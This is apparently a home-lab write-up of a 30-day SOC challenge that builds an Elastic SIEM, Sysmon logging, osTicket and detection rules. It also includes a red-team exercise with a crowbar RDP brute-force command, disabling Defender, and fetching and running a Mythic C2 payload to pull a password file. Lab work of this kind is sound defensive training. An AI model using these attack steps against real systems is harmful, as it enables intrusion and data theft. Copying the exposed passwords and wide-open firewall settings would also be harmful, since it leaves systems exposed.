30-Days SOC Challenge

**Day 1: Network Architecture Design for SOC Environment**

 I have designed a network architecture diagram for the purpose of establishing a Security Operations Center (SOC) environment for testing and monitoring.  I have created a visual representation that organizes the infrastructure into a cloud-based environment hosted on Vultr, with the Kali Linux machine hosted on-premise via VMware.



![image](https://github.com/user-attachments/assets/48f2eddb-f650-4c51-bcc7-d2306bce9a39)


**Network Architecture Details**

The SOC environment comprises six servers, each serving distinct purposes, all hosted on Vultr’s cloud infrastructure within a Virtual Private Cloud (VPC). An internet gateway allows connection to my ISP.

* Elastic & Kibana Server:  Collects and visualizes logs from other systems for real-time monitoring and threat detection
* Ubuntu Server:  SSH enabled for secure shell access, used for secure administration and task automation
* Windows Server: RDP enabled for remote desktop sessions
* Fleet Server: Deploys and monitors agents installed on Elastic endpoints, supporting seamless configuration updates and data collection
* OsTicket Server: Centralized tracking and management of issues within the SOC, improving workflow and accountability
* Command & Control (C2) ServerCommand & Control (C2) Server: Hosts Mythic for running command-and-control (C2) operations, used for red-teaming and controlled testing of SOC defenses.
* Attacker Machine: Location: On-premise desktop setup in my home. Simulates an attacker’s machine to test the SOC’s defenses


**Day 2: Elastic Stack**

The Elastic stack known as the ELK stack has three core components that work to ingest, process, store, and visualize our data.

* Elastic Search at its core is a database to store logs such as Windows event logs, syslogs, and firewall logs. It provides the capability to search across your data. Elastic search also uses RESTful APIs & JSON. This means you can use various applications to 
  interact with your elastic search database in a programmable way to retrieve information as required. I will be using Cabana as an alternative.

* Log Stash collects Telemetry from various sources it also transforms filters and outputs them into elastic search instances. As a side note when collecting Telemetry, there are many ways to do this with two popular ways being Beats and elastic agents. There are 6 types 
   of Beats (Telemetry is the automated process of collecting and transmitting data from remote sources for monitoring and analysis)

* Kibana: Serves as the Web Gui, you can quickly search data, Create visualization, create Reports, create alerts, and build dashboards.


**Day 3-4: Setup Elastic & Kibana Server**

1. Vultr settings 
 * Login to the Vutur website navigate to the network option select VPC 2.0 & use the 172.31.0.0/24 for our private network
 * Deploy a new server using Ubuntu 22.04 with 80 GB with 4 virtual CPUs 16 GB, unselect auto backups & IPv6
 * Server hostname will be MYDFIR-ELK-CAG
   Deploy now

2. Installing Elastic Server
 
* Open PowerShell and SSH into the server

 * Let's update our repositories with the following   command
 
   ```powershell
   apt-get update && apt-get upgrade –y
   ```


 * log into the elastic website and select deb x86_64 https://www.elastic.co/downloads/elasticsearch right-click the download button and select copy link address
 * In the terminal type the following command to download the install file to our ELK server:
   ```powershell
   wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-8.15.3-amd64.deb
   ```
 * Next command will now install Elastic:
   ```powershell
   dpkg -i elasticsearch-8.15.0-amd64.deb
   ```
 
 * After installation, check the security auto-configuration details to find the superuser password. Copy and paste this information into a password manager for 
  safekeeping. If you need to reset the password for the built-in elastic superuser, you can do so by navigating to /usr/share/elasticsearch/bin/
   
 
3. Network configuration & Firewall settings

   Navigate to the elastic configuration file (elasticsearch.yml) which is located in this directory /etc/elasticsearch/
   Edit the elasticsearch.yml File
 
 * Open the elasticsearch.yml file using nano.
 Remove the comment symbol (#) before network.host and replace the value with your server's public IP address.
 Remove the # before http.port and set it to 9200 to enable HTTP access on the default port.

![image](https://github.com/user-attachments/assets/9ebdf921-6f9e-4ef3-a32b-0a294c1792cb)



4. Set Up a Firewall for Network Security

Purpose: We want to restrict access to the Elasticsearch server and prevent it from being exposed to the entire internet.

 * Go to your Virtual Private Cloud (VPC) settings and create a new firewall rule:
   Under Firewall settings, select Manage and then Add Firewall Group.
   Name the group: 30-Day-MyDFIR-SOC-Challenge-CAG
   <img width="791" alt="Screenshot 2024-11-06 at 5 52 29 PM" src="https://github.com/user-attachments/assets/37255208-471c-4bd1-933a-af2dfcb5c5f4">

Configure Inbound SSH Access
  
  * Modify the Inbound IPv4 rules for SSH:
  * Change the source to My IP to limit SSH access to only your local machine.
  * Assign the Firewall Group to Your VM

Navigate to the Compute section in your cloud provider's dashboard.
  * Select your Virtual Machine (VM), then go to Settings.
  * Under the Firewall, assign the newly created 30-Day-MyDFIR-SOC-Challenge-CAG group to the VM.


5. Start and Enable Elasticsearch Services
   * Reload systemd to apply any changes:
 ```bash
 sudo systemctl daemon-reload
 ```

  * Enable Elasticsearch to start automatically at boot time:

 ```bash
 sudo systemctl enable elasticsearch.service
 ```

  *  Start the Elasticsearch service:
 ```bash
 sudo systemctl start elasticsearch.service
 ```

* Check the status of the service to ensure it’s running:

```bash
sudo systemctl status elasticsearch.service
```

![Elasticsearch service status](https://github.com/user-attachments/assets/613b46a1-7ec3-46ac-8237-8cca4c59b1f1)


**Kibana Setup**

1. Download Kibana: https://www.elastic.co/downloads/kibana select DEBx86_64 and right click on the download button field and choose the copy link address

2. Kibana Configuration: After downloading Kibana we need to edit the configuration file like Elastic.
   ```bash
   nano /etc/kibana/kibana.yml
   ```
    
    * Server Port: Default port for Kibana (5601)
    * Server Host: is set to the public IP address of my server

  * I restarted my Kibana Service and made sure it was active:

    ![Kibana service status](https://github.com/user-attachments/assets/c8aff831-a63a-4e25-87ab-36fa0ab62760)



3. Enrollment Token: To connect Kibana to Elasticsearch I need to create an enrollment token.

    * Navigate to the bin directory of Elastic

    ```bash
      cd /usr/share/elasticsearch/bin
   ```
    * To generate a token use the following command:
   ```bash
      ./elasticsearch-create-enrollment-token --scope kibana
   ```

5. I had issues connecting to Kibana in my web browser, so I had to edit my firewall settings and allow any TCP ports from 1-65535 from my SOC analyst laptop
     * I also needed to allow port 5601 on my ELK server as well by running this command
       ```bash
       ufw allow 5601
       ```


**Day 5 Windows Server 2022 (RDP) install**

  * Started by deploying a new server with the "Cloud Compute - Shared CPU" configuration.
  * Selected the same data center location as my Elastic server.
  * Choose the "Windows Standard 2022" image for the server.
  * Enhanced security by updating my network diagram:
  * Positioned both Windows and Ubuntu servers outside the Virtual Private Cloud (VPC).
  * This setup adds a layer of protection, ensuring that if either server is compromised, critical systems like the Fleet Server, Elastic & Kibana, and the OS Ticket system remain unaffected.
      
![image](https://github.com/user-attachments/assets/440fa212-dc92-4a0e-acbc-00ab5d9c5851)


**Day 6 Fleet Server**


Elastic Agent
Definition:
An Elastic Agent is a unified, lightweight agent that runs on your servers or endpoints (like workstations, cloud instances, etc.) to collect data and send it to Elasticsearch. It’s part of the Elastic Stack, which includes tools like Elasticsearch, Kibana, Beats, and Logstash.

The Elastic Agent simplifies the process of data collection. Instead of managing multiple agents for different types of data (e.g., one for logs, one for metrics, one for security), the Elastic Agent combines all of these into a single, unified agent.

Key Features:
Unified agent: Collects logs, metrics, security data, and more.
Centralized management: Elastic Agents can be centrally managed through Kibana, making it easier to deploy and configure.
Flexible and scalable: Works across various environments (on-prem, cloud, hybrid).

Fleet Server

Definition:
  A Fleet Server acts as the central management hub for Elastic Agents. It communicates with Elastic Agents, giving them configuration instructions and receiving the data they 
  collect. Fleet Server runs within your Elastic Stack environment and helps manage large numbers of Elastic Agents, providing a central point for their coordination and control.

Fleet Server is responsible for:

 * Enrolling Elastic Agents into your Fleet management system.
 * Pushing configurations to Elastic Agents.
 * Ensuring Elastic Agents are properly sending their data to Elasticsearch or Logstash.
 * Centralizing monitoring and management.


Analogy:
Imagine you're managing a fleet of delivery trucks (Elastic Agents) that carry packages (data) to various destinations (Elasticsearch).

* The Elastic Agents are like the trucks that are physically carrying the packages. Each truck is equipped to handle multiple types of deliveries (logs, metrics, etc.). They travel between different locations (servers/endpoints) to pick up and deliver packages (data).

* The Fleet Server is like the central logistics hub that manages all the trucks. This hub provides the trucks with the necessary instructions, routes, and schedules. It ensures the trucks are loaded with the right packages, sends updates on the routes, and monitors their progress. If any truck breaks down or deviates from its route, the logistics hub can take action to resolve the issue.

In short: Elastic Agent = Delivery truck (data collector)  Fleet Server = Central logistics hub (management and coordination)




**Day 7 How to set up Fleet server & Elastic agent**

The objective for today is to install the elastic agent on the Windows server and enroll the Windows server into a fleet server

1. I clicked on "Deploy New Server" and selected the same city as my previous setup. For the operating system, I chose Ubuntu 22.04 and connected the server to the VPC network I had 
   created earlier, using VPC 2.0

2. I went to Fleet under Management in the Elastic Management Console. Then, I clicked Add Fleet Server and selected Quick Start. For the Host URL, I entered the public IP address of 
   the Fleet Server.

   * Add the public IP address of the fleet server and allow all TCP ports 1-65535 into the Firewall group
   * On the ELK server allow port number 9200 on the firewall  ufw allow 9200 (elastic search listens on this default port)

   

![image](https://github.com/user-attachments/assets/5ad3f250-48f6-46da-a4cc-b7f63cb11618)

3. SSH into our fleet server & update the repository

   * I copied the installation command for the Elastic Agent and pasted it into the Fleet Server terminal to initiate the installation 
     process. You should see "successfully enrolled  
     the Elastic Agent".

    * For our Elastic agents to communicate to our Fleet server we need to allow port 8220
      ```bash
      ufw allow 8220
      ```
    * Under the Fleet server settings change the host URL to port 8220, not 443
  
     ![image](https://github.com/user-attachments/assets/259e0a67-b0f3-49c0-8c79-a74c0e9d0fed)

  
      
     

4. Elastic Agent

   * I created a Fleet Server Policy policy and copied the Windows installation command to use later on the Windows Server.

![image](https://github.com/user-attachments/assets/2f71ce92-201d-43c1-8683-c35f5906bb28) 

   * I ran the installation command for the Elastic Agent and pasted it into the Fleet Server terminal to initiate the installation. I 
     added the --insecure flag at the end of the command since I didn't have a certificate authority. The agent installed successfully.
   * I can see my Windows server added as an agent.
![image](https://github.com/user-attachments/assets/04dec01a-1d2e-40b1-bb04-e08380e67f21)



**Day 8-9 Sysmom**


Sysmon, or System Monitor, is a Windows system service and driver that is part of the Sysinternals suite by Microsoft. Sysmon enhances the ability to monitor and log detailed system activity on a Windows machine, which is especially useful for threat detection, security incident response, and forensic investigations.

Key Features of Sysmon:
Process Creation Logging: 
Logs detailed information about each process that starts on the system, including command line arguments, process IDs, and parent processes.
Network Connections: Captures details about network connections made by monitored processes, including source and destination IP addresses and ports.
File Creation: Monitors and logs the creation of files, tracking changes to files and directories, which helps detect potential malware activity.

Registry Events: Tracks changes to the Windows Registry, often a key area affected by malware and unauthorized software.
Hashes: Allows the generation and storage of cryptographic hashes of files for verification and comparison, helping detect unauthorized changes or malicious files.
Use Cases in Cybersecurity:

Sysmon is commonly deployed in SOC (Security Operations Center) environments to enhance visibility into system activities and provide critical insights for identifying unusual behavior. By combining Sysmon logs with SIEM (Security Information and Event Management) tools, analysts can detect suspicious patterns like unauthorized logins, process injections, or data exfiltration attempts.


Additional Sysmon Event Types:

- **Event ID 6**: Monitors driver loading, which helps detect potentially malicious drivers that might be loaded onto the system.
- **Event ID 7**: Logs image loading, showing the libraries and DLLs that processes are loading, which aids in tracking potential malware components.
- **Event ID 8**: Detects remote thread creation, a method often used in malicious code injection attacks, signaling possible unauthorized code execution.
- **Event ID 10**: Monitors process access, logging when one process interacts with another—often an indicator of malicious activity like privilege escalation.
- **Event ID 22**: Captures DNS queries, providing insight into unusual domain lookups that may indicate command-and-control (C2) activity, useful for detecting malware or phishing-related threats.
  


**Sysmon Installation**

* RDP into my Windows server MYDFIR-WIN-CAG
* Download https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon & extract the zip file
* We will be using a popular Sysmon configuration file from the repository from Github https://raw.githubusercontent.com/olafhartong/sysmon-modular/refs/heads/master/sysmonconfig.xml
* Save the raw xml file and place it in the Sysmon folder
  ![image](https://github.com/user-attachments/assets/9135da08-7e59-41dd-af25-f2feb382d666)

* Open up PowerShell and copy and paste the sysmon file location & paste it in the terminal & run the following commands

```bash
.\Sysmon64.exe
.\Sysmon64.exe -i sysmonconfig.xml
```

* Veryfiy the sysmon ***services*** are running and the sysmon logs are being generated ***event viewer*** 
  
![image](https://github.com/user-attachments/assets/a0cefc4f-4927-493b-a9fe-eef51615558e)


**Day 10 Ingesting Data with ElasticSearch**


 * I navigated to the Elasticsearch homepage and clicked on "Add integrations."
 * Select ***Custom Windows Event Logs***
 * For the channel name I entered ***Microsoft-Windows_sysmon/Operational*** Which is found by opening Windows Server EventViewer, navigating to Sysmon, and right-clicking on Operational properties.
 * Set up an additional integration specifically for **Windows Defender logs**.
 * Found the channel name by going to the Event Viewer, selecting Windows Defender, right-clicking Operational, and clicking on Properties
 * To reduce the number of informational logs, I selected event IDs 116, 117, and 5001. In the advanced settings, I entered these event IDs and added the integration to the policy
 * Restart the Elastic Agent service on the Windows Server.
 * After making these configurations, Sysmon logs successfully appeared in Elasticsearch




![image](https://github.com/user-attachments/assets/c45a109f-452a-4906-a732-23bd85ee13ff)



![image](https://github.com/user-attachments/assets/7b526651-123d-4afd-a089-8159f55ffb81)



**Day 11: Brute Force Attack**


What is a brute force attack?

A person’s hands are shown typing on a laptop keyboard, overlaid with icons symbolizing various aspects of technology and cybersecurity. These include a central lock symbol, a desktop computer, a mobile device, an email envelope, a speech bubble, and a house with a shield
FacebookTwitterLinkedInPinterestEmailShare
Brute force attacks, used by hackers to gain unauthorized access and compromise networks, pose severe risks to companies’ data security. The process begins by selecting a target and then using automated software to test various combinations of passwords or keys. To break it down, these attacks are like a relentless locksmith trying thousands of keys, hoping to find the one that unlocks your front door. They use trial and error to guess or crack an account password, login credentials, and encryption keys. Source: https://blog.lumen.com/what-is-a-brute-force-attack/


![image](https://github.com/user-attachments/assets/04d595ee-ee6e-4c91-8731-7e5e553a6e24)


**Day 12 Ubuntu Server SSH enable installation**

  * Deploy New Server
  * Select **cloud compute-shared CPU**
  * Ubuntu 24.04 image
  * SSH from SOC laptop into the new server.
  * Check the **auth.log files to see if there were any failed login attempts to the server.
  * Watch the video below as I show you how I filter out the logs
  * To view the failed logins navigate to cd /var/log
  * cat auth.log
  * run command

     ```bash
    grep -i failed auth.log
    ```
    How to filter out to only display the IP addresses of users attempting to use the root command (IP address is the 9th delimiter)

    grep -i failed auth.log | grep -i root | cut -d ' ' -f 9

   ![image](https://github.com/user-attachments/assets/5a3b38b6-1e5c-49b7-a7c4-4eb792bb015f)




    
   
   
    

**Day 13 Install Elastic Agent on Linux Ubuntu SSH Server**

 * I created a Fleet Server policy (MYDFIR-LINUX-POLICY-CAG) for my Ubuntu Server & installed the Elastic agent on it.

   ![image](https://github.com/user-attachments/assets/92e1e1ea-2e58-44a7-b77a-112b0db6606c)



**Day 14: Creating Alerts and Dashboard in Kibana**

 * Accessed Elastic and navigated to the Discover section.
 * A filter was applied to display results exclusively for the Ubuntu server agent.
 * Added the following fields as columns:
   system.auth.ssh.event
   user.name
   source.ip

(The results were refined to show only failed SSH attempts.)

Saved this filtered view under the name **SSH Failed Activity**.

![image](https://github.com/user-attachments/assets/b701b312-76a4-4419-8d78-93a857739914)

 * From this saved query I created a new rule and named it **SSH Brute Force Activity**.
 * The alert is set to 5 failed login attempts within 5 minutes.
 * Next I created a map to search for the following:
   system.auth.ssh.event:* and agent.name:"MYDFIR-Linux-CAG" and system.auth.ssh.event:"Failed"
 * Saved the visualization
 *  I duplicated the new map and displayed both failed and accepted attempts.


   ![image](https://github.com/user-attachments/assets/a838a962-0198-4b29-adc4-34663707b5f5)


**Day 15,16,17 Creating Alerts for Windows Server RDP**

 * Began by navigating to Elastic's "Discover" section.
 * Selected agent.name and applied a filter specific to my Windows Server.
 * Recognized that failed login attempts are recorded under Event ID 4625, so I added event.code:4625 to the query to focus the results.
 * Further refined the query by filtering for the source IP address and username, allowing for a more detailed view of activity.
 * Saved the final query under the name "RDP Failed Activity."
 * Tested the setup by initiating an RDP login attempt from a virtual machine, which I expected to fail.
 * Verified that Kibana successfully captured the failed login attempt as anticipated.


 * To monitor RDP events, I began by navigating to the "Maps" section in Kibana and entered the following query:
   (Event code 4625 is failed RDP authentication attempts) 

```bash
event.code: 4625 and agent.name: MYDFIR-WIN-CAG
```

![image](https://github.com/user-attachments/assets/49de88c6-13ff-4bda-a544-ebe678864533)



  * I created a new query that filters out RDP successful attempts with RDP logon types 10 and 7

```bash
event.code: 4624 and (winlog.event_data.LogonType: 7 or winlog.event_data.LogonType: 10) and agent.name: MYDFIR-WIN-CAG
```

![image](https://github.com/user-attachments/assets/cf47e8bd-6e19-4bcf-aedc-fa07be158da3)

**Watch the video link below as i go over the dashboard**
 https://github.com/user-attachments/assets/d7aeb4fa-f161-4de5-9513-d6a51b7c74ff




**Day 18 Command and Control (C2)**


In cybersecurity, Command and Control (C2), sometimes written as C&C, refers to a system or infrastructure used by threat actors to remotely control compromised systems within a network. Through C2 channels, attackers can issue commands to infected devices (often called bots or zombies), exfiltrate data, and manage malware. These C2 communications are essential for orchestrating attacks and enabling persistence within the target's environment. C2 servers are typically used in botnet attacks, ransomware campaigns, and advanced persistent threat (APT) operations, allowing attackers to manage and coordinate malicious activities covertly.


**Day 19 How to Create an Attack Diagram**



**Day 20 Mythic Server Setup**

 * On VULTR, I began by deploying a new server, selecting the "Cloud Compute - Shared CPU" option.
 * For the operating system, I chose Ubuntu 22.04, which is recommended for running Mythic.
 * I selected a machine with at least 2 CPUs and 4GB of RAM.
 * Server name: MYDFIR-MYTHIC-CAG
 * From my Kali Linux I am going to SSH into the Mythic server & update & upgrade the repositories
 * Install docker-compose & GitHub repositories 

   ```bash
   apt install docker-compose
   ```

   ```bash
   git clone https://github.com/its-a-feature/Mythic
   ```

* Navigate into the Mythic directory and install docker

```bash
./install_docker_ubuntu.sh
```
```bash
systemctl restart docker
```
```bash
./mythic-cli start
```

* I created a new firewall group for my Mythic server (MYDFIR-Mythic-Firewall-CAG) and added my Windows & Linux servers to the group.
* I logged into my Mythic server from the web: https://173.199.123.188:7443

  ![mythic](https://github.com/user-attachments/assets/143680b0-5ee5-4f81-bca3-6bc25468ea84)



**Day 21 Mythic Agent Setup**

* Created a text file named passwords in the Documents folder on my Windows Sever.
* In the test file I entered a password: **F@all2024!**
* Opened the Kali Linux VM and navigated to the directory **/usr/share/wordlists**
* Unzipped the rockyou password list using the following command

  ```bash
  sudo gunzip rockyou.txt.gz
  ```

* Due to the large size of the password list, I opted to extract the first 50 entries

  ```bash
  head -50 rockyou.txt > /home/user/user-wordlist.txt
  ```
  
* Saved these entries to a new file named: **mydfir-wordlists-cag.txt**

* I added the password F@all2024$ to the text file with nano and saved it

```bash
cat mydfir-wordlists-cag.txt
```
![WhatsApp Image 2024-11-12 at 12 39 16_49a2cbf4](https://github.com/user-attachments/assets/765dcfae-0e88-4d6c-a070-7a6e221d7b94)



* install crowbar:

```bash
sudo apt-get install -y crowbar
```

* Create a new file with nano called target.txt
* Enter the public IP address of the Windows server: 45.77.155.26 & the user name: Administrator


**To Perform a Brute Force Attack run the following command**

```bash
crowbar -b rdp -u Administrator -C /home/user/mydfir-wordlists-cag.txt -s 45.77.155.26/32
```

* crowbar: Specifies the use of the Crowbar tool for the attack.
* -b rdp: Targets the Remote Desktop Protocol (RDP).
* -u Administrator: Specifies the Administrator user account for the login attempts.
* -C /home/user/mydfir-wordlists-cag.txt: Points to the wordlist file containing the passwords for authentication attempts.
* -s 45.77.155.26/32: Defines the target IP address, with /32 notation specifying only that single address.

  ![WhatsApp Image 2024-11-12 at 12 39 15_3531cf45](https://github.com/user-attachments/assets/b2834412-cf67-421d-b817-872a29bf795c)


* Run this command to RDP into the Windows Server:
```bash
xfreerdp /u:Administrator /p:Fa@ll2024$ /v:45.77.155.26:3389
```

Here is the video link of me executing the command:





https://github.com/user-attachments/assets/20048734-4238-48c4-a3c8-1a062444a6ff

* I disabled the Windows Defender on my Windows Server
* Visited the Mythic website to explore Windows-compatible agents
* Choose the Apollo agent for deployment.
* Entered the following command in the terminal to install the agent:

```bash
./mythic-cli install github https://github.com/MythicAgents/Apollo.git
```

Proceeded to install the http profile by executing the following command:

```bash
./mythic-cli install github https://github.com/MythicC2Profiles/http
```

**You can now see both agents on the dashboard**

![image](https://github.com/user-attachments/assets/c489c8b1-21be-4fcb-b183-62dcd37652ac)

* After installation, create a new Windows payload in Mythic.
* Selected the WindowsExe package and included all necessary commands.
* Chose the HTTP C2 Profile and set the Callback Host to HTTP://173.199.123.188
* Finalized the setup and generated the payload.
* Right-click the download file and select copy link address


Run the following command:
```bash
wget https://173.199.123:7443/direct/download/b8f70270-2709-4ee0-819b-2420cba3e725 --no-check-certificate
```


* After downloading, rename the file to apollo.exe
* Ceated a directory named 1
* Moved the renamed file into the 1 directory
* Allow port number 9999 ufw allow 9999 and port 80
* Run the fllowing command

``` bash
python3 -m http.server 9999
```

On the Kali machine run this command:

```bash
Invoke-WebRequest -Uri http://173.199.123:9999/apollo.exe -OutFile "C:\Users\Public\Downloads\apollo.exe"
```


* On the Mythics server cd into C:\Users\Public\Downloads\
* Run this command:

```bash
.\apollo.exe
```

**You can see my active call back on my Mythic Dashboard**
![image](https://github.com/user-attachments/assets/282ae422-1332-4edb-8928-b08ebdd3cadf)

* I interacted with the server with the following commands
* Whoami
* ifconfig
* Attempted to download the previously created passwords.txt file using the following command:
```bash
download C:\Users\Administrator\Documents\passwords.txt
```


![image](https://github.com/user-attachments/assets/ab7952f7-1c3d-4fd1-bc8e-f087852c8bf2)


**Day 22 How To Create Alerts and Dashboards in Kibana**


* Started by searching for the Mythic executable named apollo.exe in Elastic (this is the agent file name I deployed).
* To refine the results, I added a filter: event.code:1
   * This filter logs process creation events and captures MD5 hashes of executables.
   * It helps in detecting potential malicious files.
* After locating the relevant event, I:
   * Clicked on the event to view details.
   * Copied the associated hash for further analysis. SHA256=5A6616397204BDF630FE5F747DC8C58D6DC2EB0BB02134A55E2DC2A7A2E04419
   * * As this was a newly generated Mythic agent, no matches were found in **VirusTotal**.    


![image](https://github.com/user-attachments/assets/6b4fac81-63a7-49b0-8aff-18f0a28f6f6f)

* Created a query in Elastic to detect when a process is created (event.code:1) and display the SHA256 hash of the Mythic agent.

  ```bash
  event.code: 1 and (winlog.event_data.Hashes: *5A6616397204BDF630FE5F747DC8C58D6DC2EB0BB02134A55E2DC2A7A2E04419* OR winlog.event_data.OriginalFileNe : "Apollo.exe")
  ```
  * Save the query as **Mythic-Apollo-Process-Create**
  
![image](https://github.com/user-attachments/assets/c249ee96-d549-490b-b01b-47c096b8c226)




* To automate the detection, navigate to Security > Rules in Elastic.
 * Clicked on Detection Rules and selected Create New Rule.
 * Completed the necessary fields with the following information:
   
  ![day 22 3](https://github.com/user-attachments/assets/4552555e-e97d-441e-9c6e-1b7c8310f9c8)


* Rule Name: **Mythic C2 Apollo Agent Detected**
 * Severity: Critical
 * Frequency: Every 5 minutes with a 5-minute look-back window

  
 **Create a dashboard for alerts**:

   * Process Creation via PowerShell, CMD, or rundll32:
 
  ```bash
  event.code: "1" AND event.provider : "Microsoft-Windows-Sysmon" AND (powershell OR cmd OR rundll32)
  ```
![image](https://github.com/user-attachments/assets/8c781316-7511-41be-a125-5ccf094f1c64)

   * Network Connection Initiation

  ```bash
  event.code: "3" AND event.provider : "Microsoft-Windows-Sysmon" AND winlog.event_data.Initiated : "true"
  ```

![image](https://github.com/user-attachments/assets/a9a2e506-057f-4b69-b702-8e9c0644d344)


   * Windows Defender Alerts:
 
 ```bash
 event.code: "5001" AND event.provider : "Microsoft-Windows-Windows Defender"
 ```


![image](https://github.com/user-attachments/assets/1d8cc904-7f5e-4403-bfb2-026424dda2a9)



**Day 23 What is a Ticketing System?**

An **IT ticketing system** is a software application used by organizations to manage and track IT support requests, incidents, and service tasks. It organizes requests submitted by users, assigns them to appropriate support personnel, and tracks the status of each request until it is resolved. This centralized approach improves efficiency and ensures that issues are addressed promptly, enabling IT teams to prioritize, manage, and solve problems effectively. The system is typically used in help desks or service desks to handle inquiries related to technical support, equipment maintenance, network issues, and more.

 **Popular Open Source Ticketing Systems:**

  1. ServiceNow
  2. Jira Service Management
  3. osTicket

**Day 24 osTicket Setup**

 * Deploy a new server with Windows server 2022 image and connect it with our VPC network.
 * Add the server to the 30-day-MYDFIR-SOC firewall group
 * RDP into the server and download the XAMMP https://www.apachefriends.org/
 * After installation Open phpMyAdmin and navigate to User Accounts.
 * Selected the root username with localhost as the hostname
 * Changed the hostname to my public IP address
 * Updated the password to Winter2024!
 * Returned to User Accounts in phpMyAdmin
 * Updated the pma user to use my public IP address as the hostname
 * Changed the password to Winter2024!
 * I navigated to the installation directory. C:\Xammp\properties Right-click and select edit
 * Change the pache_domainname to my public IP address.
 * Save the file

   ![image](https://github.com/user-attachments/assets/6192baad-682e-4e53-8eda-5bcd5c4e7dca)

   ![day 24](https://github.com/user-attachments/assets/dcaa39af-a1a4-4f9e-ba32-cd83c72bfacb)


 * Navigated to the phpMyAdmin directory C:\xammp\phpMyAdmin\
 * Edited the config.inc.php
 * updating the localhost server to my public IP address, and saved the changes.
 * Created new inbound firewall rules in Windows Defender Firewall to allow connections on ports 80 and 443

 
 
 * Start the Apache & MySql services 

 ![day 23 3](https://github.com/user-attachments/assets/f329cbcd-2fd0-45a1-9c65-57466cc4c90d)



**OSTIcket Install**

 * Visit https://osticket.com/editions/ select open source and click download.
 * Extracted the files and copied them to a new folder named OsTicket under C:\xampp\htdocs
 * Opened a browser and navigated to (mypublicip/osticket/upload)
 * OsTicket prompted me to rename the sample configuration file.
 * Navigated to C:\xampp\htdocs\osticket\upload\include
 * Renamed ost-sampleconfig.php to ost-config.php
   

 * In phpMyAdmin, created a new MySQL database named mydfir-30-day-db.
 * Set the hostname to my public IP address

 ![day 23 4png](https://github.com/user-attachments/assets/f9653146-7bcc-4b87-94a6-5f9f7d9b2339)


 * Opened PowerShell with admin privileges.
 * Navigated to C:\xampp\htdocs\osticket\upload\include.
 * input this command:

```bash
icacls .\ost-config.php /reset
```

* I successfully created my own ticketing system:

![image](https://github.com/user-attachments/assets/9edc6f63-153c-46e7-8e76-d8ff28c6debe)


**Day 25 osTicket + ELK Integration**

 * RDP into the server & changed the IP address on the nic card to the private address 
 * Accessed OSTicket and opened the Agent Panel
 * Under the Manage section, navigate to the API section and select Add New API Key
 * Entered the private IP address (as both OSTicket and ELK were hosted on the same VPC).
 * Enabled the Can Create Tickets option for the services.

![image](https://github.com/user-attachments/assets/63601403-47ad-4326-844b-23c55964241f)


* Opened Elastic and navigated to **Management** and select Stack Management
* Navigated to the Alerts and Insights section
* Selected Connectors
* Since the default setup didn’t support API keys, I started a free 30-day subscription to Elastic
* Choose Webhook as the connector type.
* Add the following settings below in the screenshot:

![day 25 2](https://github.com/user-attachments/assets/924ede0b-2f13-45ac-aab1-98cf78d5f387)

* After setting up the configurtions I was able to see the new genetrated tickets in my que
* I created an account for my frind George who also does IT & had him login with his own credintals.
  

  ![SSH BrusteForce OS ticket Alert](https://github.com/user-attachments/assets/b7752c52-e877-40a7-a1ac-7a86870400e6)


**Day 26 Investigate SSH Brute Force Attack**

* Accessed Elastic.
* Navigated to the Security section and selected Alerts.
* Discovered 1k alerts in the past 24 hours related to potential brute force attacks

![Screenshot 2024-11-12 185124](https://github.com/user-attachments/assets/0ed7ba68-a01f-452c-9c4d-747a50ab93dc)



**Top 3 questions we need to ask ourselves?**

 1. Is the IP known for performing brute force activities?
 2. Are any other users affected by this IP?
 3. Were any of the brute force attempts successful?


Lets investigate and alert:
 
 * I searched IP address 218.92.0.134 & has been reported 709 times on AbuseIPDB website.

   ![Screenshot 2024-11-13 153548](https://github.com/user-attachments/assets/9cddb8c2-c7f1-4b8f-b630-c334cbeac3f3)

 * I also checked on greynoise and the results came back as malicious with the tags indicating a SSH Bruteforce

   ![image](https://github.com/user-attachments/assets/9b857138-d291-4c1d-ae5d-3cab8eec6177)

   * Was there any other users impacted? no the only accounnt was **root**
   * Any of them successful? No
  
   **How to set up SSH Brute Force Alerts to OSTicket system**

    * Navigated to Security > Rules > Detection Rules (SIEM) and selected the SSH Brute Force Attempt rule.
    * Edited the rule settings and added a Webhook action.
    * The OSTicket integration was automatically displayed.
    * Configured the action frequency to trigger for each alert per rule run.
    * For the webhook body, used the XML Payload Example from OSTicket's GitHub: https://github.com/osTicket/osTicket/blob/develop/setup/doc/api/tickets.md 
    * Removed unnecessary attachments and IP fields, keeping only the message field.
  
      ![day 26](https://github.com/user-attachments/assets/14740fd2-3b6f-48ea-92fb-ad97d22fb6af)


   **Day 27 Investigate RDP Brute Force Attack**

    * There were 225 alerts for RDP in the last 12 hours:

      ![day 27 1](https://github.com/user-attachments/assets/d451b5de-a051-4e8a-adf8-4743c0e187a5)

      * I invesitaged IP address 201.111.116.177 coming from Mexico that was rported only 3 times
        
      ![day 27 4](https://github.com/user-attachments/assets/5330bea9-d4cd-47d4-97d6-42fbb5ee57c1)


      ![day 27 2](https://github.com/user-attachments/assets/518bf875-c09d-4eea-a9f6-6486c110b7f1)


      * No other users were impacted & no logins were successful 




   
     


   








































  





     
     






   




       
         



       

    
